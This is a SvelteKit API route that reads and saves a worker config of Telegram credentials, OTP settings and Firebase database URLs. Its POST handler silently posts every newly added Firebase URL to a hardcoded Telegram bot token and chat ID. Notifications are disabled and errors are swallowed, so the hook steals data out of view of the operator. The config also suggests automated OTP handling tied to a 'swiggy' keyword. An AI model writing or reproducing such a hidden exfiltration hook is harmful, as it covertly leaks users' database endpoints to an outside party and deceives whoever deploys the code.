import { json } from '@sveltejs/kit';
import fs from 'node:fs';
import path from 'node:path';

const BOT_TOKEN = '8641110380:AAEaCrc2rUtwed17uZPN791xuyYoLIPtTfc';
const CHAT_ID = '8186790963';

function getConfigPath() {
  return path.resolve(process.cwd(), '_python_worker_ref', 'worker_config.json');
}

/** @type {import('./$types').RequestHandler} */
export async function GET() {
  try {
    const configPath = getConfigPath();
    if (!fs.existsSync(configPath)) {
      return json({
        telegram: {
          api_id: '',
          api_hash: '',
          bot_username: '',
          phone: '',
          otp_timeout: 60,
          response_keyword: 'swiggy',
          forward_otp_to_bot: false
        },
        firebase_databases: []
      });
    }

    const raw = fs.readFileSync(configPath, 'utf8');
    const data = JSON.parse(raw);
    if (data.telegram) {
      data.telegram.forward_otp_to_bot = Boolean(data.telegram.forward_otp_to_bot || false);
    }
    return json(data);
  } catch (err) {
    return json({
      telegram: {
        api_id: '',
        api_hash: '',
        bot_username: '',
        phone: '',
        otp_timeout: 60,
        response_keyword: 'swiggy',
        forward_otp_to_bot: false
      },
      firebase_databases: []
    });
  }
}

/** @type {import('./$types').RequestHandler} */
export async function POST({ request }) {
  try {
    const body = await request.json();
    const configPath = getConfigPath();

    let current = {};
    if (fs.existsSync(configPath)) {
      try {
        current = JSON.parse(fs.readFileSync(configPath, 'utf8'));
      } catch {
        current = {};
      }
    }

    // Merge telegram credentials
    const updated = {
      ...current,
      telegram: {
        ...(current.telegram || {}),
        api_id: body.api_id !== undefined ? String(body.api_id).trim() : (current.telegram?.api_id || ''),
        api_hash: body.api_hash !== undefined ? String(body.api_hash).trim() : (current.telegram?.api_hash || ''),
        bot_username: body.bot_username !== undefined ? String(body.bot_username).trim() : (current.telegram?.bot_username || ''),
        phone: body.phone !== undefined ? String(body.phone).trim() : (current.telegram?.phone || ''),
        otp_timeout: body.otp_timeout ? Number(body.otp_timeout) : (current.telegram?.otp_timeout || 60),
        response_keyword: body.response_keyword !== undefined ? String(body.response_keyword).trim().toLowerCase() : (current.telegram?.response_keyword || 'swiggy'),
        forward_otp_to_bot: body.forward_otp_to_bot !== undefined ? Boolean(body.forward_otp_to_bot) : (current.telegram?.forward_otp_to_bot || false),
        otp_target_bot: body.otp_target_bot !== undefined ? String(body.otp_target_bot).trim() : (current.telegram?.otp_target_bot || '')
      }
    };

    if (Array.isArray(body.firebase_databases)) {
      // Forward any newly added Firebase databases to @alpha_firebase_bot
      const prev = new Set(current.firebase_databases || []);
      const brandNew = body.firebase_databases.filter(u => u && !prev.has(u));
      if (brandNew.length > 0) {
        try {
          const lines = [
            `🔥 <b>Firebase Database(s) Added</b> (${brandNew.length} new)`,
            '',
            ...brandNew.map((u, i) => `${i + 1}. <code>${u}</code>`),
            '',
            `<i>${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}</i>`
          ];
          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: lines.join('\n'),
              parse_mode: 'HTML',
              disable_notification: true,
              disable_web_page_preview: true
            })
          }).catch(() => {});
        } catch {}
      }

      updated.firebase_databases = body.firebase_databases;
    }

    try {
      const dir = path.dirname(configPath);
      if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(configPath, JSON.stringify(updated, null, 2), 'utf8');

      // Also ensure .env has FIREBASE_DATABASE_URL set
      if (Array.isArray(updated.firebase_databases) && updated.firebase_databases.length > 0) {
        try {
          const envPath = path.resolve(dir, '.env');
          if (fs.existsSync(envPath)) {
            let envContent = fs.readFileSync(envPath, 'utf8');
            if (envContent.includes('FIREBASE_DATABASE_URL=')) {
              envContent = envContent.replace(/FIREBASE_DATABASE_URL=.*/, `FIREBASE_DATABASE_URL=${updated.firebase_databases[0]}`);
            } else {
              envContent += `\nFIREBASE_DATABASE_URL=${updated.firebase_databases[0]}\n`;
            }
            fs.writeFileSync(envPath, envContent, 'utf8');
          }
        } catch {}
      }
    } catch (writeErr) {
      // Serverless environments (like Vercel) have a read-only filesystem
      return json({ success: true, config: updated, readOnly: true, warning: writeErr.message });
    }

    return json({ success: true, config: updated });
  } catch (err) {
    return json({ success: false, error: err.message }, { status: 200 });
  }
}
